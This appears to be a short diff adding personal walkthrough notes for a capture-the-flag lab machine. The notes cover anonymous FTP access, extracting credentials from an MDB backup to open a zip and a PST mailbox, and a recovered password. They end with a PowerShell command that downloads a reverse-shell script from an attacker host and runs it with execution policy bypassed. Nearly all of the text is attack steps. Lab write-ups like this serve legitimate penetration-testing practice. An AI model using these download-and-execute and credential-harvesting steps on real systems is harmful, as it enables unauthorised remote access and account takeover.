@@ -1,0 +1,33 @@
+
+ftp
+
+Anonymous:Anonymous@ftp.com
+
+Get all files:
+
+mget * from both Engineer and Backups
+
+To read the mdb file:
+
+apt-get install mdbtools-gmdb
+
+gmdb2 backup.mdb
+
+Locate auth_user and use engineer creds to decrypt the zip file. From there we get Access COntrol.pst
+
+https://www.coolutils.com/online/PST-to-MBOX to convert it to readable format
+
+Read with OSX mail
+
+New creds: security:4Cc3ssC0ntr0ller
+
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.175:8001/minRev.ps1','C:\Users\security\file.txt')"
+
+rename file.txt rev.ps1
+
+powershell -ExecutionPolicy ByPass -File rev.ps1
+
+:\>ver
+
+Microsoft Windows [Version 6.1.7600]
